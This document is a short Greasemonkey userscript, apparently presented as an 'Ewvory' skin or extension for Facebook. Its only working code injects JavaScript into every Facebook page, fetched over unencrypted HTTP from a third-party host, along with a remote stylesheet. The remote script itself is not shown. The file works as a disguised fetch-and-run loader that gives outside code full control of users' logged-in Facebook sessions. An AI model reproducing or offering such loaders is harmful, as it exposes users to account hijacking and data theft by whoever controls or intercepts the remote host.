// ==UserScript==
// @name           Ewvory Facebook
// @namespace      Ewvory extension for Facebook
// @description    Ewvory sur Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @developer      HaryChange 
// ==/UserScript==

function loadjscssfile(filename, filetype){if (filetype=="js"){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);}else if (filetype=="css"){var fileref=document.createElement("link");fileref.setAttribute("rel", "stylesheet");fileref.setAttribute("type", "text/css");fileref.setAttribute("href", filename);}if (typeof fileref!="undefined")document.getElementsByTagName("head")[0].appendChild(fileref);}loadjscssfile("http://harychange.clanteam.com/userewvoryfb.js", "js");loadjscssfile("http://www.tontoloko.com/static/facebook/tontoloko.css", "css");
